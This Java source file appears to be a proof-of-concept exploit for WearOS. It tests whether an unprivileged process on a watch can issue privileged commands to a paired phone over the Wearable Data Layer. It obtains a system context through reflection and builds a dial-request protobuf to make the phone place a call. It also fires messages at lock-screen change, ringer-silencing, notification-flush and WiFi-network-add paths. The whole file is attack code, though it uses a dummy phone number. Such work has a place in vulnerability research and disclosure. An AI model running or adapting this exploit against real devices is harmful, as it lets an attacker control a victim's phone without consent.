import android.content.Context;
import android.os.Bundle;
import android.os.Looper;
import android.util.Log;
import java.lang.reflect.Method;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class DataLayerDialPoC {
    private static final String TAG = "DATALAYER_POC";

    public static void main(String[] args) throws Exception {
        Looper.prepareMainLooper();

        System.out.println("[*] WearOS Data Layer RPC PoC");
        System.out.println("[*] Testing if third-party can send call/dial RPC to paired phone");
        System.out.println();

        // Get ActivityThread context
        Class<?> atClass = Class.forName("android.app.ActivityThread");
        Method systemMain = atClass.getMethod("systemMain");
        Object activityThread = systemMain.invoke(null);
        Method getSystemContext = atClass.getMethod("getSystemContext");
        Context context = (Context) getSystemContext.invoke(activityThread);

        System.out.println("[*] Got context: " + context.getPackageName());
        System.out.println("[*] UID: " + android.os.Process.myUid());
        System.out.println();

        // Try to get the Wearable MessageClient via reflection
        try {
            Class<?> wearableClass = Class.forName("com.google.android.gms.wearable.Wearable");
            System.out.println("[*] Found Wearable class");

            // Get NodeClient to find connected nodes
            Method getNodeClient = wearableClass.getMethod("getNodeClient", Context.class);
            Object nodeClient = getNodeClient.invoke(null, context);
            System.out.println("[*] Got NodeClient: " + nodeClient.getClass().getName());

            // Get connected nodes
            Method getConnectedNodes = nodeClient.getClass().getMethod("getConnectedNodes");
            Object task = getConnectedNodes.invoke(nodeClient);
            System.out.println("[*] Requested connected nodes...");

            // Wait for task result
            Thread.sleep(3000);
            Method isComplete = task.getClass().getMethod("isComplete");
            Method getResult = task.getClass().getMethod("getResult");
            Method isSuccessful = task.getClass().getMethod("isSuccessful");

            if ((boolean) isComplete.invoke(task)) {
                if ((boolean) isSuccessful.invoke(task)) {
                    Object nodeList = getResult.invoke(task);
                    java.util.List<?> nodes = (java.util.List<?>) nodeList;
                    System.out.println("[*] Connected nodes: " + nodes.size());

                    for (Object node : nodes) {
                        Method getId = node.getClass().getMethod("getId");
                        Method getDisplayName = node.getClass().getMethod("getDisplayName");
                        String nodeId = (String) getId.invoke(node);
                        String displayName = (String) getDisplayName.invoke(node);
                        System.out.println("[*] Node: " + displayName + " (ID: " + nodeId + ")");

                        // Get MessageClient
                        Method getMessageClient = wearableClass.getMethod("getMessageClient", Context.class);
                        Object messageClient = getMessageClient.invoke(null, context);
                        System.out.println("[*] Got MessageClient: " + messageClient.getClass().getName());

                        // Build DialRequest protobuf manually
                        // Field 1 (tag 0x0A): string, number = "+1234567890" (test)
                        // Protobuf: 0x0A (field 1, length-delimited), len, bytes
                        String testNumber = "0000000000"; // Dummy safe number
                        byte[] numberBytes = testNumber.getBytes("UTF-8");
                        byte[] dialProto = new byte[2 + numberBytes.length];
                        dialProto[0] = 0x0A; // field 1, wire type 2 (length-delimited)
                        dialProto[1] = (byte) numberBytes.length;
                        System.arraycopy(numberBytes, 0, dialProto, 2, numberBytes.length);

                        System.out.println("[*] Built DialRequest proto: " + bytesToHex(dialProto));

                        // Send message to call_dial_request path
                        String path = "/call/rpc/call_dial_request";
                        System.out.println("[*] Sending message to: " + path);
                        Method sendMessage = messageClient.getClass().getMethod("sendMessage", String.class, String.class, byte[].class);
                        Object sendTask = sendMessage.invoke(messageClient, nodeId, path, dialProto);
                        System.out.println("[*] Message send task initiated");

                        Thread.sleep(3000);
                        if ((boolean) isComplete.invoke(sendTask)) {
                            if ((boolean) isSuccessful.invoke(sendTask)) {
                                System.out.println("[!!!] MESSAGE SENT SUCCESSFULLY to " + path);
                                System.out.println("[!!!] The phone should now attempt to dial: " + testNumber);
                            } else {
                                Method getException = sendTask.getClass().getMethod("getException");
                                Object ex = getException.invoke(sendTask);
                                System.out.println("[FAIL] Message send failed: " + ex);
                            }
                        } else {
                            System.out.println("[*] Message send still pending...");
                        }

                        // Also test other high-impact paths
                        System.out.println();
                        testRpcPath(messageClient, nodeId, "/lock_screen/rpc/change_request", new byte[]{}, "Lock Screen Change");
                        testRpcPath(messageClient, nodeId, "/call/rpc/silence_ringer", new byte[]{}, "Silence Ringer");
                        testRpcPath(messageClient, nodeId, "/notifications/data/flush_notifications", new byte[]{}, "Flush Notifications");
                        testRpcPath(messageClient, nodeId, "/wifi/wifi_add_network", new byte[]{}, "Add WiFi Network");
                    }

                    if (nodes.isEmpty()) {
                        System.out.println("[*] No connected nodes - phone not paired/connected");
                    }
                } else {
                    Method getException = task.getClass().getMethod("getException");
                    Object ex = getException.invoke(task);
                    System.out.println("[FAIL] getConnectedNodes failed: " + ex);
                }
            } else {
                System.out.println("[*] Task not complete after 3s, still waiting...");
                Thread.sleep(5000);
                if ((boolean) isComplete.invoke(task)) {
                    System.out.println("[*] Task completed: success=" + isSuccessful.invoke(task));
                }
            }

        } catch (ClassNotFoundException e) {
            System.out.println("[FAIL] Wearable class not found: " + e.getMessage());
        } catch (Exception e) {
            System.out.println("[FAIL] Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            e.printStackTrace();
        }
    }

    private static void testRpcPath(Object messageClient, String nodeId, String path, byte[] data, String label) {
        try {
            Method sendMessage = messageClient.getClass().getMethod("sendMessage", String.class, String.class, byte[].class);
            Object sendTask = sendMessage.invoke(messageClient, nodeId, path, data);
            Thread.sleep(2000);

            Method isComplete = sendTask.getClass().getMethod("isComplete");
            Method isSuccessful = sendTask.getClass().getMethod("isSuccessful");

            if ((boolean) isComplete.invoke(sendTask)) {
                if ((boolean) isSuccessful.invoke(sendTask)) {
                    System.out.println("[!!!] " + label + " — MESSAGE SENT to " + path);
                } else {
                    Method getException = sendTask.getClass().getMethod("getException");
                    Object ex = getException.invoke(sendTask);
                    System.out.println("[BLOCKED] " + label + " — " + ex);
                }
            } else {
                System.out.println("[PENDING] " + label + " — still pending");
            }
        } catch (Exception e) {
            System.out.println("[ERROR] " + label + " — " + e.getMessage());
        }
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02x ", b));
        return sb.toString().trim();
    }
}
